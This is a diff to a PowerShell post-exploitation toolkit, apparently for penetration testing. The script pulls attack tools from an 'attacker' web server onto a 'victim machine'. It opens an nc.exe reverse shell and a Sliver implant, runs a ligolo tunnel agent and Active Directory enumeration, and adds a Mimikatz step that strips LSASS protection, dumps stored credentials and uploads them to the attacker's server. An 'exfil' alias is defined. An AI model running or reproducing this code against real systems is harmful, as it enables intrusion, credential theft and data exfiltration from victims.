@@ -19,27 +19,32 @@
 #>
 
 function Global:Set-PSToolBoxConfig {
-    $Global:AttackerIP = Read-Host "Enter the attacker's IP address "
+    Param (
+        [switch]$Reset
+    )
+    if (-not $Global:AttackerIP -or $Reset) {
+        $Global:AttackerIP = Read-Host "Enter the attacker's IP address "
+    
+        $Global:WebServerPort = Read-Host "Enter the web server port number "
 
-    $Global:WebServerPort = Read-Host "Enter the web server port number "
+        $isSecure = Read-Host "Will the web server be secure? [N] (Y/N)"
+        $isSecure = $(($isSecure.ToUpper()) -eq 'Y' -or $($isSecure.ToUpper()) -eq 'YES')
+        if ($isSecure) {
+            $Global:WebServerProtocol = 'https'
+        }
+        else {
+            $Global:WebServerProtocol = 'http'
+        }
 
-    $isSecure = Read-Host "Will the web server be secure? [N] (Y/N)"
-    $isSecure = $(($isSecure.ToUpper()) -eq 'Y' -or $($isSecure.ToUpper()) -eq 'YES')
-    if ($isSecure) {
-        $Global:WebServerProtocol = 'https'
+        $loc = Read-Host "Enter the directory to store Toolbox items in on victim machine. [C:\users\public] "
+        if ($loc) {
+            $Global:ToolboxLocation = $loc
+        }
+        else {
+            $Global:ToolboxLocation = 'C:\users\public'
+        }
+        $Global:WebServerRoot = "$($Global:WebServerProtocol)://$($Global:AttackerIP):$($Global:WebServerPort)/"
     }
-    else {
-        $Global:WebServerProtocol = 'http'
-    }
-
-    $loc = Read-Host "Enter the directory to store Toolbox items in on victim machine. [C:\users\public] "
-    if ($loc) {
-        $Global:ToolboxLocation = $loc
-    }
-    else {
-        $Global:ToolboxLocation = 'C:\users\public'
-    }
-    $Global:WebServerRoot = "$($Global:WebServerProtocol)://$($Global:AttackerIP):$($Global:WebServerPort)/"
 }
 function Global:Show-PSToolboxConfig {
     Write-Host "Current Configuration:" -ForegroundColor Cyan
@@ -56,7 +61,7 @@ function Global:Get-SingleToolboxItem {
     {
         $name = Split-Path $item -Leaf
     }
-    Invoke-WebRequest -Uri $Global:WebServerRoot + $item -OutFile "$Global:ToolboxLocation\$name"
+    Invoke-WebRequest -Uri $($Global:WebServerRoot + $item) -OutFile "$Global:ToolboxLocation\$name"
 }
 
 function Global:Start-LigoloAgent {
@@ -66,13 +71,15 @@ function Global:Start-LigoloAgent {
     )
     Set-Location $Global:ToolboxLocation
     Get-SingleToolboxItem -item 'tools/ligolo/ligolo_win_agent051.exe'
-    & ./tools/ligolo/ligolo_win_agent051.exe -connect "$($ip):$($port)" -ignore-cert
+    Start-Job -ScriptBlock {
+        param([string[]]$arg1,[string]$arg2,[int]$arg3)
+        & $arg1\ligolo_win_agent051.exe -connect "$($arg2):$($arg3)" -ignore-cert} -ArgumentList $Global:ToolboxLocation,$ip,$port
 }
 
 function Global:Start-SharpHound {
     Set-Location $Global:ToolboxLocation
     Get-SingleToolboxItem -item 'enum/sharphound.exe'
-    & ./enum/sharphound.exe --CollectionMethods All
+    & ./sharphound.exe --CollectionMethods All
 }
 
 function Global:Start-Shell {
@@ -86,11 +93,11 @@ function Global:Start-Shell {
     switch ($type) {
         'NC' { 
             Get-SingleToolboxItem -item 'tools/nc.exe'
-            & "$location\tools\nc.exe" $ip $port -e cmd.exe
+            & "$location\nc.exe" $ip $port -e cmd.exe
          }
          'Sliver' {
             Get-SingleToolboxItem -item 'tools/sliver8000.exe'
-            & ./tools/sliver8000.exe
+            & ./sliver8000.exe
          }
     }
 }
@@ -99,19 +106,32 @@ function Global:Start-AdEnum {
     Set-Location $Global:ToolboxLocation
     Get-SingleToolboxItem -item 'enum/adenumv2.ps1'
     Get-SingleToolboxItem -item 'enum/powerview.ps1'
-    . ./enum/adenumv2.ps1
-    . ./enum/powerview.ps1
+    . ./adenumv2.ps1
+    . ./powerview.ps1
     Get-AllObjectsFromAD
     Show-SimpleReport -Path $env:tmp -user $env:USERNAME -domain $script:DName
 }
 
 function Global:Start-Winpeas {
     Get-SingleToolboxItem -item 'privesc/winpeasx64.exe'
-    & ./privesc/winpeasx64.exe
+    & ./winpeasx64.exe
+}
+
+function Global:Start-Mimikatz {
+    param (
+        [ValidateSet("x86","x64")]
+        [string]$bitness = "x64"
+    )
+    $cdir = $(Get-Location).Path
+    gti -m mimi
+    Set-Location .\tools\mimikatz\x64\
+    & ./mimikatz.exe "privilege::debug" "token::elevate" "!+" "!processprotect /process:lsass.exe /remove" "log mimi.log" "lsadump::cache" "lsadump::secrets" "lsadump::lsa" "sekurlsa::logonpasswords" "vault::cred" "sekurlsa::credman" exit
+    UploadToWebServer -filepath "$($(Get-Location).Path)\mimi.log"
+    Set-Location $cdir
 }
 
 function Global:Get-potatos {
-    Get-ToolboxItems -m potatos
+    Get-ToolboxItems -m potato
     Get-ToolboxItems -m spoofer
 }
 
@@ -326,3 +346,4 @@ Set-PSToolboxConfig
     Set-Alias -Name gti -Value Get-ToolBoxItems
     Set-Alias -Name upload -Value UploadToWebServer
     Set-Alias -Name exfil -Value Send-FilesHome
+    Set-Location $Script:ToolboxLocation
